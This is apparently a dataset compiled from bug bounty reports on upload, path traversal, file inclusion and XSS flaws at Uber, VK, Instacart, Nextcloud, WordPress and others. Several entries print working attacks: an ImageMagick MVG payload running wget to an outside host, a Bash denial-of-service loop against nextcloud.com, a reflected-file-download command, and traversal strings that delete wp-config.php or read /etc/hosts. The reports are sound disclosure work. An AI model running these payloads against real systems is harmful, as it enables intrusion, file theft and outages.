+While this is not as bad as JS execution, I believe that this still qualifies as a vulnerability. In all other image upload forms (e.g. profile picture upload), Uber carefully checks that the image is valid before accepting it and hosting it. In this case, Uber fails to do so. 
+
+Thanks,
+David Dworken
+===== FU-130591 | Stored XSS thru SVG upload | sev=None | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=191 | src=summaries
+Researcher found a way to add XSS code to SVG uploads in our software. We have improved our software by preventing SVG and HTML files to be presented in the webbrowser to prevent XSS attacks.
+===== FU-131028 | Malicious File Upload | sev=None | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=194 | src=summaries
+This researcher found a vulnerability in which it was possible to upload attachments with malicious extensions. We have implemented a security filter to prevent these attachments to be uploaded.
+===== FU-134032 | newrelic.com rails directory traversal vuln | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-135072 | RCE in profile picture upload | sev=None | bounty=None | substate=resolved | weak=Code Injection | len=1784 | src=vulnerability_information
+Issue
+=====
+The profile picture upload at /settings/profile/edit is vulnerable to remote code execution due to the uploaded file being passed to ImageMagick without checking whether it's an actual image. Combined with the fact that ImageMagick parses ASCII text as so called MVG (Magic Vector Graphics), this enables an attacker to trigger a newly discovered vulnerability in MVG parsing which allows for command injection.
+
+Steps to reproduce
+======
+Upload the following ASCII file as **x.gif** using the regular profile picture upload flow:
+```
+push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
+pop graphic-context
+```
+This executes the `wget` command and makes an HTTP request to 1.2.3.4 on port 1337.
+
+Technical details
+======
+The "image" directive in MVG allows for the usage of so called "delegates" which are somewhat similar to a protocol specifier in a URL: a colon-seperated (delegate,argument)-pair like e.g. "label:SomeText" can be specified, invoking the respective delegate handler. Custom delegates can be added as a bash-call with substitute variables in /etc/ImageMagick/delegates.xml. The handler for https-URLs uses a bash command to invoke curl which suffers from the command injection vulnerability.
+
+Recommendation
+======
+A simple fix is to check the magic values of the uploaded files and whitelist those, i.e. to only allow JPEG, GIF and PNG uploads before passing the file to ImageMagick (e.g. the `convert` utility).
+Also, servers that do image processing should not be able to establish outbound network connections.
+This vulnerability will be reported to ImageMagick within the next 72 hours as a detailed advisory about this and several other MVG issues is currently being drafted.
+===== FU-140548 | [upload-X.my.mail.ru] /uploadphoto Insecure Direct Object References | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-142135 | XSS в upload.php | sev=None | bounty=1500.0 | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=5967 | src=vulnerability_information
+Добрый вечер!
+Раскрутил интересную xss на upload.php.
+
+**Демо [тут](https://vk.com/app5486273) или [тут](https://irek.wtf/vk.com/transport/).**
+
+Как все было?
+Увидел интересный экшн [upload.php?act=transport](https://pu.vk.com/c415824/upload.php?act=transport&to_act=add_doc&hash=8dfd93e60c78ddb4a9cf914c27f7642c&rhash=8171a35e59a63aab65846a26345ddbf6&aid=1&mid=17274528&callback=getUploadSvg), который служит для загрузки нарисованного граффити в документы. Глаз зацепился за вызов функции `eval` в строке 25. Обратите внимание на параметр `callback`, значением которого в данном случае является строка `getUploadSvg`.  На этой странице определена функция `sendData` (строки 11-52) и, помимо этого, выполняется следующий кусок кода (строки 55-64):
+
+    var _ua = navigator.userAgent;
+    var locDomain = location.host.toString().match(/[a-zA-Z]+\.[a-zA-Z]+\.?$/)[0];
+    if (/opera/i.test(_ua) || !/msie 6/i.test(_ua) || document.domain != locDomain) {
+      document.domain = locDomain;
+    }
+    if (window.parent) {
+      parent.getUploadSvg(function(data) {
+        sendData('/c415824/upload.php?transport=iframe&act=add_doc&hash=8dfd93e60c78ddb4a9cf914c27f7642c&rhash=8171a35e59a63aab65846a26345ddbf6&aid=1&mid=17274528&pda=', data);
+      });
+    }
+
+, где есть два условных оператора с бессмысленными условиями 👳🏾. В первом проставляется `document.domain` для кроссдоменного выполнения сценариев, а во втором все самое интересное - вызывается функция родительского окна `parent.getUploadSvg`, где `getUploadSvg` это значение GET-параметра `callback` ~~(как уже было написано выше)~~ и его значение можно менять на любое другое (предположительно подходящее под паттерн `/^[a-zA-Z0-9]*$/`). То есть функции `parent.{значение параметра callback}` передается один аргумент, являющийся анонимной функцией. Эта анонимная функция принимает один параметр `data`, а в её теле происходит вызов функции `sendData` (строка 62):
+
+    sendData('/c415824/upload.php?transport=iframe&act=add_doc&hash=8dfd93e60c78ddb4a9cf914c27f7642c&rhash=8171a35e59a63aab65846a26345ddbf6&aid=1&mid=17274528&pda=', data);
+
+
+Тут первый аргумент это строка, содержащая относительный URL, в который попадают почти все исходные GET-параметры, проходя перед выводом санитизацию. Второй параметр это переменная `data`, о которой писал чуть выше.
+
+Разберем саму функцию `sendData`. Она принимает три аргумента `url`, `file` и `sequel `. По понятным причинам, нам интересны только первые два. Стоит обратить внимание на строку 16
+
+    var plain = /iphone|ipod|ipad|opera mini|opera mobi/i.test(navigator.userAgent);
+
+и блок кода условного оператора в строках 29-41
+
+    if (plain) {
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+
+      if (dataUrl.length > 15000) {
+        fdataUrl = dataUrl.substr(0, 15000);
+        ndataUrl = dataUrl.substr(15000);
+        dataUrl = fdataUrl;
+        more = 1;
+      }
+
+      xhr.send(ajx2q({Data: dataUrl, more: more, sequel: sequel || 0}));
+    } else {
+
+Остановились мы на этом потому, что в строке 40 происходит вызов функции `ajx2q `, которая не определена и, поэтому, сохранение граффити в документы не работает для юзерагентов удовлетворяющих регулярному выражению `/iphone|ipod|ipad|opera mini|opera mobi/i`. Следовательно и хак не будет работать. Если не обращать внимания на сей досадный факт, то можно заметить, что в функции `sendData` с помощью `XMLHttpRequest` происходит POST-запрос на URL, параметрами которого мы можем манипулировать. В случае успеха, результат запроса передается в функцию `eval`, что круто если каким-то образом заставить сервер выдавать нужный нам ответ на этот POST-запрос. Поскольку мы можем манипулировать параметрами URL, на который будет произведен запрос, я начал думать над тем как заставить сервер отвечать на запрос моим js-кодом. Тут я вспомнил о том, что существуют такие штуки как [imagejs](http://jklmnn.de/imagejs/) и [share.php](https://vk.com/share.php?url=https://irek.wtf/shareit.php). Первое нам интересно потому что позволяет встроить js-код прямо файлы картинок (Gif, Bitmap, WebP, Netbpm Anymap, Progressive Graphics) и файлы будут валидны. А в share.php как-раз есть проксирование изображений ([пример](https://pu.vk.com/c539421/upload.php?act=proxy_img&url=https%3A%2F%2Firek.wtf%2Fpikachu.gif&hash=f5b4a65619ba2c63a7bb018db018bfce)). Тут я столкнулся с другой проблемой - хэши. Это была боль, но методом тыка я понял, что если передать скрипту `upload_fails.php` все необходимые параметры и добавить к ним `role=share`, то можно получить необходимые валидные хэши, используя которые можно скрафтить конечный URL. На этом этапе использовалась особенность санитизации переданных параметров (при изучении демо обратите внимание на точки в названиях параметров, они там не случайно). Осталось разобраться с последней проблемой. Заключается она в том, что `sendData` просто так не вызывается. Надо найти такую js-функцию, для которой выполняются следующие условия:
+
+* название функции должно содержать только те символы, которые можно передать через GET-параметр `callback` и функция должна быть глобальной;
+* функция должна принимать в качестве аргумента другую callback-функцию и вызвать её передавая в качестве аргумента какой-нибудь объект.
+
+Немного `for (... in window)` и такая функция была найдена - `requestAnimationFrame` ([документация](https://developer.mozilla.org/ru/docs/DOM/window.requestAnimationFrame)).
+
+Далее реализовал демо, которое можно посмотреть [тут](https://vk.com/app5486273) или [тут](https://irek.wtf/vk.com/transport/). Выполняется `alert(document.cookie);`.
+
+Таким образом, получили xss для браузеров, строка user-agent которых не попадают под паттерн `/iphone|ipod|ipad|opera mini|opera mobi/i` и в которых имплементирована функция `requestAnimationFrame ` (или с вендорными префиксами `mozRequestAnimationFrame`, `webkitRequestAnimationFrame`, `msRequestAnimationFrame`).
+===== FU-142352 | (Pornhub & Youporn & Brazzers ANDROID APP) : Upload Malicious APK / Overrite Existing APK  / Android BackOffice Access | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-142562 | [RCE] Unserialize to XXE - file disclosure on ams.upload.pornhub.com | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-143903 | File upload over private IM channel | sev=None | bounty=None | substate=resolved | weak=Privilege Escalation | len=207 | src=vulnerability_information
+A team member can upload the files in the private IM chat channel of other members.This can be done by using the IM channel id.
+Please refer to the attached POC's.
+Let me know if any more details are needed.
+===== FU-145604 | Avatar image upload and bypass  real image verification  | sev=None | bounty=None | substate=informative | weak=Violation of Secure Design Principles | len=1114 | src=vulnerability_information
+Hi
+
+We can bypass Avatar Upload image verification and extension  uploading a php file or any other extension binding a valide  jpeg image  , there is no risk for the moment because the avatar is renamed to avatar_upload on the remote server , but it ll be nice to secure this part of code .
+
+Example  
+---------------
+here is the same file with two different extension : 
+
+http://91.121.108.101/image1.jpg
+http://91.121.108.101/image1.php      <== execute php code inside the image 
+
+1) download image1.jpg
+
+2) as you can see  if you open the file image1.jpg  file on notepad it hide php code ( phpinfo(); function in this case .
+
+3) rename image1.jpg to image1.php  , and try to upload it on the avatar upload form , it pass the verification  .
+
+This verification is not enought in this  file :  /core/controller/avatarcontroller.php  
+
+
+	if ($image->valid()) {
+				$mimeType = $image->mimeType();
+				if ($mimeType !== 'image/jpeg' && $mimeType !== 'image/png') {
+					return new DataResponse(
+						['data' => ['message' => $this->l->t('Unknown filetype')]],
+						Http::STATUS_OK,
+						$headers
+					);
+				}
+===== FU-145950 | Uploading files to a folder where invited user don't have any EDIT privilege | sev=None | bounty=None | substate=resolved | weak=Improper Authentication - Generic | len=440 | src=vulnerability_information
+Hi,
+
+Any invited user to a shared folder with no edit privilege can create files in it through copy feature of ``Nextclod`` android app.
+
+### Steps to reproduce it
+
++ Create any folder and invite a user in it without any edit privilege.
++ Now login from invited user account through android app.
++ Copy any file from your ``nextcloud`` root folder to shared folder.
++ Check nextcloud web app!! Copied file will show in shared folder
+
+Thanks
+===== FU-147570 | Local File Inclusion path bypass | sev=None | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=870 | src=vulnerability_information
+Hey,
+
+After reading egix's report #59665 and seeing your fix at https://github.com/concrete5/concrete5/commit/19d0cc81c7cd485b856289ac71ebc0389ea7c3da & https://github.com/concrete5/concrete5/commit/c646dd0defcfa79ef119dca8ba1beba2c5bc91ea I think the fixes are insufficient to stop lfi.
+
+If you are going to stick with the `strpos()` trick, you missed something. 
+```php
+$path = $request->getPathInfo();
+$path = rawurldecode($request->getPathInfo());
+ if (substr($path, 0, 3) == '../' || substr($path, -3) == '/..' || strpos($path, '/../') ||
+     substr($path, 0, 3) == '..\\' || substr($path, -3) == '\\..' || strpos($path, '\\..\\')) {
+``` 
+while that is one way to go. you forgot about "../\", " ..\/", "/\.." & "\/.." this works because some oses (unix like) parse the backslash to forward slash and proceed. add those and I think you should be fine. :)
+
+Thanks,
+P
+===== FU-150783 | Arbitrary File Reading | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-155690 | Arbitrary File Upload in Logo & Log in image Theming setting. | sev=None | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=851 | src=vulnerability_information
+Hi team
+
+First I think this vulnerability doesn't fall at your bug bounty program but this is a bad design that should fix right now cause if an attacker get admin access he still can upload a malicious file in client server side.
+
+I saw that Logo & Log in image allow to upload other files type example *.html and it'll execute in client server.
+Other case,I created an html code and saved it as image file,server still executed it as html file.
+The Logo & Log in image will upload it into ../data/themedinstancelogo & ../data/themedbackgroundlogo
+
+Good news,I tried to upload an php file but server executed that file as text.
+
+PoC:
+Upload an html file through logo upload and Log in image and you will see that file will execute.
+
+http://example.com/nextcloud/data/themedinstancelogo
+http://example.com/nextcloud/data/themedbackgroundlogo
+
+Regards,
+===== FU-158016 | Server side request forgery on image upload for lists | sev=None | bounty=50.0 | substate=resolved | weak=Code Injection | len=761 | src=vulnerability_information
+Summary
+----------
+
+There is a Server-side request forgery when updating the image for a list.
+
+Steps to reproduce
+-----------------
+
+1. Create a list and change its image. That will send a POST request to https://beta.instacart.com/api/v2/lists/[LIST_ID] with the following parameters:
+
+    ```
+list[remote_image_url]=https://example.com/yourimage.jpg
+```
+
+2. Change the  url to http://127.0.0.1:21 and you will get as response:
+
+    ```{json}
+{
+	"meta":
+	{
+		"code": 400,
+		"error_type": "List Error",
+		"error_message": "There was an error while updating this list",
+		"errors": ["Image could not download file: wrong status line: \"SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3\""]
+	}
+}
+```
+    Which shows that it tried to connect to the SSH port on localhost.
+===== FU-158021 | Image Upload Path Disclosure | sev=None | bounty=100.0 | substate=resolved | weak=Information Disclosure | len=953 | src=vulnerability_information
+Hi,
+
+Firstly,I couldn't see anything about Path Disclosure in your policy,so I've decided to report it.
+
+Steps to reproduce :
+
+1-Create a list for a store
+2-Add background image from link (File has to be .svg) like aaa.com/aaa.svg
+3-Then it will give an error
+
+Let's take a look to that error
+
+{"meta":{"code":400,"error_type":"List Error","error_message":"There was an error while updating this list","errors":["Image must be a JPEG or PNG","Image Failed to manipulate with rmagick, maybe it is not an image? Original Error: no decode delegate for this image format `/var/app/20160809T225101Z/tmp/uploads/1470789216-24489-0001-8854/full_redirect_2.svg' @ error/svg.c/ReadSVGImage/2871"]}}
+
+
+As you can understand from error's Response this is the path disclosure
+
+/var/app/20160809T225101Z/tmp/uploads/1470789216-24489-0001-8854/full_redirect_2.svg
+
+I'm gonna add a screenshot from Request and Response for being more clear about it.
+
+Thanks,Instacart.
+===== FU-158505 | Reflected File Download on recipe list search | sev=None | bounty=None | substate=informative | weak=Command Injection - Generic | len=2552 | src=vulnerability_information
+Hi guys,
+
+Right now I'm searching for JSON issues on your API so I started to go deep into the XHR requests.
+When I noticed the following request:
+https://www.instacart.com/api/v2/searches?cart_id=3471936&term=rfd&page=1&per=100&max_per_row=7&skip_other_warehouses=true&disable_autocorrect=false&source=web&warehouse_id=129&zone_id=12
+
+Which returned the following output:
+
+{"meta":{"code":200,"source":"search_service","cluster":null},"data":{"term":"xss","inventory_area_id":617,"items":[],"total_results":0,"aisles":[],"warehouses":[],"search_strategies":[],"tracking":{},"product_type_filter":false,"has_deals":false,"search_id":141585110},"pagination":{"total":0,"page":1,"per_page":50}}
+
+I noticed that "term" parameter was reflected on the JSON format output so I tried a Reflected File Download.
+
+Proof-of-concept:
+https://www.instacart.com/api/v2/searches.bat?cart_id=&term="||start chrome davidsopas.com/poc/malware.htm||&page=1&per=100&max_per_row=7&skip_other_warehouses=true&disable_autocorrect=false&source=web&warehouse_id=129&zone_id=12
+
+Reflecting:
+{"meta":{"code":200,"source":"search_service","cluster":null},"data":{"term":"\"||start chrome davidsopas.com/poc/malware.htm||","inventory_area_id":617,"items":[],"total_results":0,"aisles":[],"warehouses":[],"search_strategies":["used_or_operator"],"tracking":{},"product_type_filter":false,"has_deals":false,"search_id":141585846},"pagination":{"total":0,"page":1,"per_page":50}}
+
+So I got my RFD attack now (even with URL permissive), next step was to create a special crafted page to force the download:
+http://0xhack.com/instacart_rfd.htm
+
+Note: You need to be authenticated with a Instacart account.
+
+Check the attached screenshots on latest versions of Chrome and Opera.
+
+So in my proof-of-concept I was able to run a new Google Chrome window with a html file simulating a malicious file on the Windows operative system.
+
+A malicious user could:
+
+1 - Launch a malicious campaign with the specially crafted page - similar to my PoC
+2 - Victim downloads the file thinking that is from a trusted domain [instacart.com]
+3 - Malicious user gains control over victims machine
+
+This kind of attack is very dangerous and could lead to millions of users infected by malicious campaigns. Possibility of gaining operating system access from Instacart users is a high risk of security.
+
+Solution:
+Use content-disposition header to force a filename download. Also "term" parameter should be encoded to prevent this kind of reflection on the output.
+
+Hope it helps.
+
+Best,
+David Sopas
+@dsopas
+===== FU-159820 | Issues with uploading list images | sev=None | bounty=None | substate=resolved | weak=Uncontrolled Resource Consumption | len=1216 | src=vulnerability_information
+Hi,
+
+There are several issues with uploading images for a list, i.e. with a PUT request to `https://www.instacart.com/api/v2/lists/153253` and passing `list[remote_image_url]`.
+
+First, information about open ports and SSH information can be disclosed via different urls. For example, PUT-ing localhost:80 will return a 404 error, but localhost:1010 will return a connection refused error. PUT-ing localhost:22 will, return `"Image could not download file: wrong status line: 'SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3'"`, showing that OpenSSH version 6.6.1p1 is being used, which is outdated and may be vulnerable to published exploits.
+
+Passing a value such as `http://google.com` will show that rmagick is being used, with an error: `"Image must be a JPEG or PNG","Image Failed to manipulate with rmagick, maybe it is not an image? Original Error: unable to open file `/tmp/magick-ezcF8DGU': No such file or directory @ error/constitute.c/ReadImage/583"`
+
+Finally, uploading a JPG such as in [https://hackerone.com/reports/390] makes the server timeout and returns a 502 error, overflowing the memory. I have attached the image below.
+
+Thanks for your time, and please let me know if you need any more information.
+===== FU-163421 | Wordpress: Directory Traversal / Denial of Serivce | sev=None | bounty=None | substate=resolved | weak=Information Disclosure | len=1192 | src=vulnerability_information
+Hello Security team,
+While testing nextcloud.com i have found that you are not using the lastest version of wordpress you are using old version 4.5.3 which is vulnerable to Directory Traversal / Denial of Serivce
+
+Description :
+
+A path traversal vulnerability was found in the Core Ajax handlers of the WordPress Admin API. This issue can be used by an Subscriber to create a denial of service.
+
+POC
+
+The following Bash script can be used to exploit this vulnerability
+```
+#!/bin/bash
+target="https://nextcloud.com"
+username="subscriber"
+password="password"
+cookiejar=$(mktemp)
+
+# login
+curl --cookie-jar "$cookiejar" \
+   --data "log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" \
+   "$target/wp-login.php" \
+   >/dev/null 2>&1
+
+# exhaust apache
+for i in `seq 1 1000`
+   do
+      curl --cookie "$cookiejar" \
+      --data "plugin=../../../../../../../../../../dev/random&action=update-plugin" \
+      "$target/wp-admin/admin-ajax.php" \
+      >/dev/null 2>&1 &
+done
+
+rm "$cookiejar"
+```
+### FIX :
+
+Upgrade your wordpress to 4.6
+
+More details about vulnerability : `https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html`
+===== FU-167481 | Android - Possible to intercept broadcasts about uploaded files | sev=None | bounty=None | substate=resolved | weak=Information Disclosure | len=1696 | src=vulnerability_information
+Hi.
+There are the moments of sending unprotected broadcasts
+https://github.com/nextcloud/android/blob/master/src/com/owncloud/android/files/services/FileUploader.java#L1170
+https://github.com/nextcloud/android/blob/master/src/com/owncloud/android/files/services/FileUploader.java#L1116
+https://github.com/nextcloud/android/blob/master/src/com/owncloud/android/files/services/FileUploader.java#L1136
+https://github.com/nextcloud/android/blob/600225c7c9684295bfdb43bcf7d078113b8b2f73/src/com/owncloud/android/services/SyncFolderHandler.java#L186
+https://github.com/nextcloud/android/blob/600225c7c9684295bfdb43bcf7d078113b8b2f73/src/com/owncloud/android/services/SyncFolderHandler.java#L201
+etc
+A malware can simply create a receiver:
+```xml
+<receiver android:exported="true" android:enabled="true" android:name=".InterceptReceiver">
+	<intent-filter android:priority="999">
+		<action android:name="FileUploader.UPLOAD_START"/>
+		<action android:name="FileUploader.UPLOAD_FINISH"/>
+		<action android:name="FileUploader.UPLOADS_ADDED"/>
+	</intent-filter>
+</receiver>
+```
+(and other actions)
+And receive the broadcasts **first** than your own receivers
+More info about priority here
+https://developer.android.com/guide/topics/manifest/intent-filter-element.html#priority
+
+It will disclose info about account, file info, etc
+
+The one thing you should do is to change all calls of ```Context.sendStickyBroadcast``` on ```LocalBroadcastManager.sendBroadcast``` and all calls of ```Context.registerReceiver``` on ```LocalBroadcastManager.registerReceiver```
+https://developer.android.com/reference/android/support/v4/content/LocalBroadcastManager.html
+instead on using ```removeStickyBroadcast(intent);```
+===== FU-172694 | Critical : Malware and XSS file can be uploaded and executed on udemy | sev=None | bounty=None | substate=informative | weak=Cross-site Scripting (XSS) - Generic | len=174 | src=summaries
+The investigator found that he can upload any file type to our upload bucket.  That is intended behavior - file content is enforced before moving it out of our upload bucket.
+===== FU-179034 | [Airship CMS] Local File Inclusion - RST Parser | sev=high | bounty=None | substate=resolved | weak=Information Disclosure | len=1607 | src=vulnerability_information
+Airship uses the very useful RST Parser from Gregwar. However, the parser has the RST directive `include` built-in (why it isn't a separate directive per the spec, I don't know). However, as a result, LFI is possible in Airship.
+
+I realize this isn't directly Paragonie's code, but since Airship uses this library, I wanted to let you know. I found two instances in the Airship codebase and don't appear to take this side effect in to account:
+
+https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/Cabin/Hull/Landing/CustomPages.php#L186
+
+https://github.com/paragonie/airship/blob/58f96aa0e5002b60e74456502d9bfc9483d77b3d/src/lens_functions.php#L714
+
+The parser has this problem here:
+
+https://github.com/Gregwar/RST/blob/master/Parser.php#L762. There doesn't appear to be a way for users of this library to turn it off short of re-implementing their own parser. The spec itself recognizes this security impact: http://docutils.sourceforge.net/docs/ref/rst/directives.html#include.
+
+To demonstrate:
+
+`rst.php`:
+
+~~~
+<?php
+
+require('autoload.php');
+
+
+$parser = new Gregwar\RST\Parser;
+
+// RST document
+$document = '*Test*
+
+.. include:: /./../../../../../../../../../../../../../../../../../../etc/hosts
+
+``test``
+';
+
+// Parse it
+$html = $parser->parse($document);
+
+// Render it
+echo $html;
+~~~
+
+Output:
+
+~~~
+$ php rst.php
+<p><em>Test</em></p>
+<p>##
+# Host Database
+#
+# localhost is used to configure the loopback interface
+# when the system is booting.  Do not change this entry.
+##
+127.0.0.1	localhost
+255.255.255.255	broadcasthost
+::1             localhost </p>
+
+[...]
+~~~
+===== FU-182557 | links the user may download can be a malicious files | sev=high | bounty=None | substate=informative | weak=Code Injection | len=1953 | src=vulnerability_information
+Hi,
+
+## Summary:
+
+This vulnerability is pretty simple and pretty dangerous at the same time 
+
+Almost any link the user tries to download it's extension is set according to the file extension in the path 
+if the path is `/` then it download's it according to the domain name  
+Eg:
+[1] http://example.com/example.php
+if the user downloaded the link the file type would be `.php`
+that's not very dangerous though 
+
+[2] http://example.com/example.exe
+if the user downloaded the link the file type would be `.exe`
+Okey that's dangerous but it requires a lot of social engineering 
+ 
+[3] http://example.com/
+if the user downloaded the link the file type would be `.com`
+this requires less social engineering and it's pretty dangerous 
+why?
+because `.com` files are executable files which may can do what `.exe` can do
+here's links about `.com` files
+https://en.wikipedia.org/wiki/COM_file
+and the difference between `.exe` and `.com`
+https://blogs.msdn.microsoft.com/oldnewthing/20080324-00/?p=23033
+
+there's a new many domain names which may can create malicious extensions like `.com`
+as example
+`.com.py`
+which can create a python file 
+
+any website can make his favorable extension in the domain path and when the user downloads it it will be downloaded by the extension
+as example http://example.com/example.exe
+
+## Products affected: 
+
+windows 10 x64 brave latest version 
+
+## Steps To Reproduce:
+
+there is 3 ways to reproduce 
+[1]
+execute this html 
+`<a href="http://example.com" download>http://example.com</a>`
+right click on the link > Save Link as... > Save
+[2]
+go to http://example.com
+right click > Save Page as... > Save
+[3]
+execute this html and directly click the link it will download directly 
+`<a href="http://example.com" download>http://example.com</a>`
+
+
+####Note : 
+The none exist pages can't be downloaded 
+
+----------
+Any link the users tries to download must be `.htm` or `.html`
+
+
+## Supporting Material/References:
+F135079
+
+Thanks!
+===== FU-183568 | [Buddypress] Arbitrary File Deletion through bp_avatar_set | sev=high | bounty=None | substate=resolved | weak=None | len=1922 | src=vulnerability_information
+Hi,
+The bp_avatar_set action in BuddyPress when cropping avatars allows an attacker to arbitrarily delete a file the webserver can delete through the 'original_file' parameter.
+
+For example:
+
+* Create a user on a Buddypress-powered Wordpress instance (any user is OK, doesn't need to be admin, just needs to have the ability to change it's own avatar in the Buddypress profile which is normal).
+* Navigate to the avatar change URL for example /members/<username>/profile/change-avatar/ on my install.
+* Click the button to upload an image and select any valid image. Allow the first request which uploads this image to submit as normal.
+* Select the crop button, but do not allow the request to complete (I used Burp and enabled intercept mode). Modify the request to change the original_file parameter to point to a file you wish to delete, traversing up with ../.. if needed. So for example where my legitimate param was:
+
+original_file=http%3A%2F%2Flocalhost%2F~sam%2Fwordpress%2Fwp-content%2Fuploads%2Favatars%2F2%2Fmy_ugly_face.jpg
+
+Change to:
+
+original_file=http%3A%2F%2Flocalhost%2F~sam%2Fwordpress%2Fwp-content%2Fuploads%2Favatars%2F2%2F../../../../../wp-config.php
+
+Remember it will be in a numbered folder probably, so you need one more .. than expected from the URL. You can upload an image for real to see how the path ends up for guidance on this if you're an attacker and don't know the folder structure.
+
+The wp-config.php file will be deleted when unlink() is called and the blog will then be unavailable, of course, in this case.
+
+This path needs to be somehow validated such that it can only delete uploaded avatars (constraining to the upload directory would still allow you to delete, say, other users avatars, or other uploaded files, which would still make me sad :()
+
+Let me know if you have any trouble reproducing or need any further info - I think I explained OK, but it is very late here. ;)
+
+o/
+===== FU-183925 | Unrestricted File Download / Path Traversal | sev=low | bounty=None | substate=resolved | weak=Information Disclosure | len=196 | src=summaries
+A misconfigured USTRANSCOM website allowed arbitrary system files to be downloaded. ziot was able to demonstrate this vulnerability by downloading a file from a specially crafted URL. Thanks ziot!
+===== FU-183978 | Local File Inclusion vulnerability on an Army system allows downloading local files | sev=high | bounty=None | substate=resolved | weak=Information Disclosure | len=269 | src=summaries
+A misconfigured Army website may have allowed unauthorized users to remotely download local files, potentially revealing sensitive system or user information. Nahamsec was able to demonstrate this vulnerability by crafting a particularly formatted URL. Thanks Nahamsec!
+===== FU-184596 | Unrestricted File Upload | sev=critical | bounty=None | substate=resolved | weak=Command Injection - Generic | len=213 | src=summaries
+A Navy system had a file upload tool accessible from the Internet. This would have permitted an attacker to upload malicious files and potentially execute code on the server. Thanks to @hogarth45 for reporting it.
+===== FU-186326 | Arbitary file download vulnerability on a DoD website | sev=low | bounty=None | substate=resolved | weak=Information Disclosure | len=762 | src=summaries
+A DoD website was misconfigured in a manner that could have allowed an attacker to collect sensitive information about the web application or system. @psychomantis was able to demonstrate this vulnerability by crafting a specially formatted URL. Thank you for notifying us of this vulnerability!
+
+
+This website demonstrated a quite classic file disclosure vulnerability, the website contained a feature to download pdf's and documents off the website, this was quite similar to the events calendar file disclosure vulnerability. The website looked as followed, website.com/xxx/account/downloadfile?fileString=/pathtodocument/document.pdf. We could view the etc/shadow or other sensitive files by traversing the directory structure using ../ and access the files.
+===== FU-187413 | SVG Uploads / Attachments can be viewed by anyone that knows the URL | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-191243 | File upload vulnerability on a DoD website | sev=medium | bounty=None | substate=resolved | weak=Unrestricted Upload of File with Dangerous Type | len=294 | src=summaries
+A Department of Defense website was misconfigured in a manner that may have allowed an attacker to bypass tests for malicious files when uploading content. @korprit was able to demonstrate this vulnerability by altering the file sufficiently to defeat signature based analysis. Thanks @korprit!
+===== FU-193877 | The contact page is vulnerable to self-XSS via upload file name | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-194351 | Able to download arbitrary  PHP files at yelpblog.com | sev=none | bounty=None | substate=resolved | weak=Privilege Escalation | len=739 | src=vulnerability_information
+There is a misconfigured wordpress installation at yelpblog.com, through which i am able to download any php files in wp-includes folder.
+
+For a PoC, you can open https://www.yelpblog.com/wp-includes/wp-db.php, and the wp-db.php will be download(along with all the data in it)
+
+As we all know that these PHP files can sensative information of a website, and the wp-includes folder is the base of a WordPress installation, Being able to download php files is a clearly wrong behaviour of a wordpress installation.
+The PHP files in wp-includes can have a lot of sensative information about the server, which may help a attacker in compromising the server. He can even do a source code analysis if he is able to download arbitrary 
+PHP files.
+===== FU-196448 | Local file inclusion vulnerability on a DoD website | sev=medium | bounty=None | substate=resolved | weak=Privilege Escalation | len=269 | src=summaries
+A misconfigured Department of Defense website may have allowed unauthorized users to remotely download local files, potentially revealing sensitive system or user information. @fransrosen was able to demonstrate this vulnerability by crafting a specially formatted URL.
+===== FU-201529 | Can upload files without authentication on AirFibre 3.2 | sev=low | bounty=None | substate=resolved | weak=Violation of Secure Design Principles | len=1157 | src=vulnerability_information
+A POST submission such as below will upload a file to the tmp/upload directory without requiring authentication.  I have been unable to redirect the upload to another directory so cannot utilize for RCE however an attacker is able to use this to fill the disk space on the device which could cause a DoS.  
+
+This could be combined with another vulnerability such as an LFI.
+
+POST http://1[ip]/login.cgi HTTP/1.1
+Proxy-Connection: keep-alive
+Content-Length: 5179
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfhSBNfoYzLOvXnc
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.8
+Host: 1[ip]
+
+------WebKitFormBoundaryRfhSBNfoYzLOvXnc
+Content-Disposition: form-data; name="file"; filename="test6.txt"
+Content-Type: text/plain
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+------WebKitFormBoundaryRfhSBNfoYzLOvXnc--
+===== FU-202681 | XSS in content type header when uploading file. | sev=None | bounty=None | substate=None | weak=None | len=0 | src=None
+===== FU-203515 | Wordpress 4.7.2 - Two XSS in Media Upload when file too large. | sev=high | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=2953 | src=vulnerability_information
+Description
+-------------------
+An attacker can inject a malicious script in to the filename which a victim tries to upload leading to XSS inside the administrators control panel.
+
